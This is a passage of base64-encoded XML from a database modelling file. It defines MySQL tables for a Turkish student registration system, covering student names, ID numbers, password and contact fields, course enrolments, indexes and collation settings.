9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJvcnRhbGFtYSIvPgoJCQkJCQk8L284PgoJCQkJCQk8bzk+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8QXV0b2luY3JlbWVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxDaGFyc2V0IHZhbHVlPSJ1dGY4Ii8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0idXRmOF90dXJraXNoX2NpIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IkJhxZ9hcsSxbMSxLCBCYcWfYXLEsXPEsXosIERldmFtc8SxeiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjciLz4KCQkJCQkJCQk8SW5kZXhlZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxMZW5ndGggdmFsdWU9IjkiLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0ic29udWMiLz4KCQkJCQkJCQk8TnVsbGFibGUgdmFsdWU9IjEiLz4KCQkJCQkJCQk8T25fVXBkYXRlX1NldF9DdXJyZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPFByZWNpc2lvbiB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxTY2FsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJDaGFyIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxVbnNpZ25lZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxaZXJvZmlsbCB2YWx1ZT0iMCIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9InNvbnVjIi8+CgkJCQkJCTwvbzk+CgkJCQkJPC9maWVsZD4KCQkJCQk8aW5kZXg+CgkJCQkJCTxvMD4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxDb21tZW50IHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRzIHZhbHVlPSJiMmR5Wlc1amFVNXYiLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iRktfb2dyZW5jaWtheWl0Ii8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkJUUkVFIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9IkZLX29ncmVuY2lrYXlpdCIvPgoJCQkJCQk8L28wPgoJCQkJCQk8bzE+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPEZpZWxkcyB2YWx1ZT0iYTNWeWMwNXYiLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iRktfb2dyZW5jaWtheWl0S3Vyc2xhciIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJCVFJFRSIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjAiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJGS19vZ3JlbmNpa2F5aXRLdXJzbGFyIi8+CgkJCQkJCTwvbzE+CgkJCQkJCTxvMj4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxDb21tZW50IHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRzIHZhbHVlPSJhM1Z5YzA1diBiMmR5Wlc1amFVNXYiLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0ia3Vyc05vIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkJUUkVFIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMSIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9Imt1cnNObyIvPgoJCQkJCQk8L28yPgoJCQkJCQk8bzM+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPEZpZWxkcyB2YWx1ZT0iYjJkeVpXNWphVXRoZVdsMFNVUT0iLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0ib2dyZW5jaUtheWl0SUQiLz4KCQkJCQkJCQk8VHlwZSB2YWx1ZT0iQlRSRUUiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIxIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0ib2dyZW5jaUtheWl0SUQiLz4KCQkJCQkJPC9vMz4KCQkJCQkJPG80PgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxGaWVsZHMgdmFsdWU9ImIyZHlaVzVqYVV0aGVXbDBTVVE9IGEzVnljMDV2IGIyZHlaVzVqYVU1diIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJQUklNQVJZIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkJUUkVFIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMSIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9IlBSSU1BUlkiLz4KCQkJCQkJPC9vND4KCQkJCQk8L2luZGV4PgoJCQkJCTxuYW1lIHZhbHVlPSJvZ3JlbmNpa2F5aXQiLz4KCQkJCQk8dW5pcXVlPgoJCQkJCQk8bzA+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8RmllbGRzIHZhbHVlPSJhM1Z5YzA1diBiMmR5Wlc1amFVNXYiLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0ia3Vyc05vIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0ia3Vyc05vIi8+CgkJCQkJCTwvbzA+CgkJCQkJCTxvMT4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxGaWVsZHMgdmFsdWU9ImIyZHlaVzVqYVV0aGVXbDBTVVE9Ii8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9Im9ncmVuY2lLYXlpdElEIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0ib2dyZW5jaUtheWl0SUQiLz4KCQkJCQkJPC9vMT4KCQkJCQkJPG8yPgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEZpZWxkcyB2YWx1ZT0iYjJkeVpXNWphVXRoZVdsMFNVUT0gYTNWeWMwNXYgYjJkeVpXNWphVTV2Ii8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9IlBSSU1BUlkiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJQUklNQVJZIi8+CgkJCQkJCTwvbzI+CgkJCQkJPC91bmlxdWU+CgkJCQk8L28xPgoJCQkJPG8yPgoJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJPEF1dG9pbmNyZW1lbnQgdmFsdWU9IjAiLz4KCQkJCQkJPEF2ZXJhZ2VfUm93X1NpemUgdmFsdWU9IjYwNiIvPgoJCQkJCQk8Q2hhcnNldCB2YWx1ZT0idXRmOCIvPgoJCQkJCQk8Q29sbGF0aW9uIHZhbHVlPSJ1dGY4X3R1cmtpc2hfY2kiLz4KCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQk8Q3JlYXRlX1RpbWUgdmFsdWU9IjIwMTUtMDMtMzEgMDI6MTE6NTYiLz4KCQkJCQkJPEVuZ2luZSB2YWx1ZT0iSW5ub0RCIi8+CgkJCQkJCTxGaWVsZF9Db3VudCB2YWx1ZT0iMTciLz4KCQkJCQkJPEluZGV4X0NvdW50IHZhbHVlPSI4Ii8+CgkJCQkJCTxMaW5rX0NvdW50IHZhbHVlPSI1Ii8+CgkJCQkJCTxOYW1lIHZhbHVlPSJvZ3JlbmNpbGVyIi8+CgkJCQkJCTxQcmltYXJ5X0tleSB2YWx1ZT0iYjJkeVpXNWphVTV2Ii8+CgkJCQkJCTxSZWNvcmRfQ291bnQgdmFsdWU9IjI3Ii8+CgkJCQkJCTxTaXplIHZhbHVlPSIxMjguMDAgS2IiLz4KCQkJCQkJPFRyaWdnZXJfQ291bnQgdmFsdWU9IjAiLz4KCQkJCQkJPFVuaXF1ZV9Db3VudCB2YWx1ZT0iMSIvPgoJCQkJCQk8VXBkYXRlX1RpbWUgdmFsdWU9IiIvPgoJCQkJCTwvUHJvcGVydGllcz4KCQkJCQk8Y29udHJvbCB2YWx1ZT0iVGFibGUyIi8+CgkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCTxmaWVsZD4KCQkJCQkJPG8wPgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEF1dG9pbmNyZW1lbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8Q2hhcnNldCB2YWx1ZT0idXRmOCIvPgoJCQkJCQkJCTxDb2xsYXRpb24gdmFsdWU9InV0ZjhfdHVya2lzaF9jaSIvPgoJCQkJCQkJCTxDb21tZW50IHZhbHVlPSIiLz4KCQkJCQkJCQk8RGVmYXVsdF9WYWx1ZSB2YWx1ZT0iWW9rIi8+CgkJCQkJCQkJPEZpZWxkX1Bvc2l0aW9uIHZhbHVlPSIxNCIvPgoJCQkJCQkJCTxJbmRleGVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPExlbmd0aCB2YWx1ZT0iMjAwIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9ImFjaWtsYW1hIi8+CgkJCQkJCQkJPE51bGxhYmxlIHZhbHVlPSIxIi8+CgkJCQkJCQkJPE9uX1VwZGF0ZV9TZXRfQ3VycmVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxQcmVjaXNpb24gdmFsdWU9IjAiLz4KCQkJCQkJCQk8U2NhbGUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VHlwZSB2YWx1ZT0iVmFyQ2hhciIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VW5zaWduZWQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8WmVyb2ZpbGwgdmFsdWU9IjAiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJhY2lrbGFtYSIvPgoJCQkJCQk8L28wPgoJCQkJCQk8bzE+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8QXV0b2luY3JlbWVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxDaGFyc2V0IHZhbHVlPSJ1dGY4Ii8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0idXRmOF90dXJraXNoX2NpIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjIiLz4KCQkJCQkJCQk8SW5kZXhlZCB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxMZW5ndGggdmFsdWU9IjIwMCIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJhZGkiLz4KCQkJCQkJCQk8TnVsbGFibGUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8T25fVXBkYXRlX1NldF9DdXJyZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPFByZWNpc2lvbiB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxTY2FsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJWYXJDaGFyIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxVbnNpZ25lZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxaZXJvZmlsbCB2YWx1ZT0iMCIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9ImFkaSIvPgoJCQkJCQk8L28xPgoJCQkJCQk8bzEwPgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEF1dG9pbmNyZW1lbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8Q2hhcnNldCB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjEyIi8+CgkJCQkJCQkJPEluZGV4ZWQgdmFsdWU9IjEiLz4KCQkJCQkJCQk8TGVuZ3RoIHZhbHVlPSItMSIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJrYXlpdFRhcmloaSIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkRhdGUiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0ia2F5aXRUYXJpaGkiLz4KCQkJCQkJPC9vMTA+CgkJCQkJCTxvMTE+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8QXV0b2luY3JlbWVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxDaGFyc2V0IHZhbHVlPSJ1dGY4Ii8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0idXRmOF90dXJraXNoX2NpIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IlRDIEtpbWxpayBObyIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjEiLz4KCQkJCQkJCQk8SW5kZXhlZCB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxMZW5ndGggdmFsdWU9IjExIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9Im9ncmVuY2lObyIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkNoYXIiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIxIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0ib2dyZW5jaU5vIi8+CgkJCQkJCTwvbzExPgoJCQkJCQk8bzEyPgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEF1dG9pbmNyZW1lbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8Q2hhcnNldCB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjEzIi8+CgkJCQkJCQkJPEluZGV4ZWQgdmFsdWU9IjEiLz4KCQkJCQkJCQk8TGVuZ3RoIHZhbHVlPSI0Ii8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9Im9ncmVuaW1EdXJ1bXUiLz4KCQkJCQkJCQk8TnVsbGFibGUgdmFsdWU9IjEiLz4KCQkJCQkJCQk8T25fVXBkYXRlX1NldF9DdXJyZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPFByZWNpc2lvbiB2YWx1ZT0iMyIvPgoJCQkJCQkJCTxTY2FsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJUaW55SW50Ii8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxVbnNpZ25lZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxaZXJvZmlsbCB2YWx1ZT0iMCIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9Im9ncmVuaW1EdXJ1bXUiLz4KCQkJCQkJPC9vMTI+CgkJCQkJCTxvMTM+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8QXV0b2luY3JlbWVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxDaGFyc2V0IHZhbHVlPSJ1dGY4Ii8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0idXRmOF90dXJraXNoX2NpIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9Im1kNSBmb3JtYXTEsW5kYSBzYWtsYW7EsXlvci4uLiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjQiLz4KCQkJCQkJCQk8SW5kZXhlZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxMZW5ndGggdmFsdWU9IjMyIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9InNpZnJlIi8+CgkJCQkJCQkJPE51bGxhYmxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPE9uX1VwZGF0ZV9TZXRfQ3VycmVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxQcmVjaXNpb24gdmFsdWU9IjAiLz4KCQkJCQkJCQk8U2NhbGUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VHlwZSB2YWx1ZT0iQ2hhciIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VW5zaWduZWQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8WmVyb2ZpbGwgdmFsdWU9IjAiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJzaWZyZSIvPgoJCQkJCQk8L28xMz4KCQkJCQkJPG8xND4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxBdXRvaW5jcmVtZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPENoYXJzZXQgdmFsdWU9InV0ZjgiLz4KCQkJCQkJCQk8Q29sbGF0aW9uIHZhbHVlPSJ1dGY4X3R1cmtpc2hfY2kiLz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPERlZmF1bHRfVmFsdWUgdmFsdWU9IiIvPgoJCQkJCQkJCTxGaWVsZF9Qb3NpdGlvbiB2YWx1ZT0iMyIvPgoJCQkJCQkJCTxJbmRleGVkIHZhbHVlPSIxIi8+CgkJCQkJCQkJPExlbmd0aCB2YWx1ZT0iNDAiLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0ic295YWRpIi8+CgkJCQkJCQkJPE51bGxhYmxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPE9uX1VwZGF0ZV9TZXRfQ3VycmVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxQcmVjaXNpb24gdmFsdWU9IjAiLz4KCQkJCQkJCQk8U2NhbGUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VHlwZSB2YWx1ZT0iVmFyQ2hhciIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VW5zaWduZWQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8WmVyb2ZpbGwgdmFsdWU9IjAiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJzb3lhZGkiLz4KCQkJCQkJPC9vMTQ+CgkJCQkJCTxvMTU+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8QXV0b2luY3JlbWVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxDaGFyc2V0IHZhbHVlPSJ1dGY4Ii8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0idXRmOF90dXJraXNoX2NpIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjUiLz4KCQkJCQkJCQk8SW5kZXhlZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxMZW5ndGggdmFsdWU9IjEwIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9InRlbGVmb25ObyIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkNoYXIiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0idGVsZWZvbk5vIi8+CgkJCQkJCTwvbzE1PgoJCQkJCQk8bzE2PgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEF1dG9pbmNyZW1lbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8Q2hhcnNldCB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPEZpZWxkX1Bvc2l0aW9uIHZhbHVlPSIxNiIvPgoJCQkJCQkJCTxJbmRleGVkIHZhbHVlPSIxIi8+CgkJCQkJCQkJPExlbmd0aCB2YWx1ZT0iNCIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJ6YW1hbkRpbGltaSIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIzIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IlRpbnlJbnQiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iemFtYW5EaWxpbWkiLz4KCQkJCQkJPC9vMTY+CgkJCQkJCTxvMj4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxBdXRvaW5jcmVtZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPENoYXJzZXQgdmFsdWU9InV0ZjgiLz4KCQkJCQkJCQk8Q29sbGF0aW9uIHZhbHVlPSJ1dGY4X3R1cmtpc2hfY2kiLz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPERlZmF1bHRfVmFsdWUgdmFsdWU9IkdpcmlsbWVtacWfIi8+CgkJCQkJCQkJPEZpZWxkX1Bvc2l0aW9uIHZhbHVlPSI4Ii8+CgkJCQkJCQkJPEluZGV4ZWQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8TGVuZ3RoIHZhbHVlPSIxMDAiLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iYWRyZXMiLz4KCQkJCQkJCQk8TnVsbGFibGUgdmFsdWU9IjEiLz4KCQkJCQkJCQk8T25fVXBkYXRlX1NldF9DdXJyZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPFByZWNpc2lvbiB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxTY2FsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJWYXJ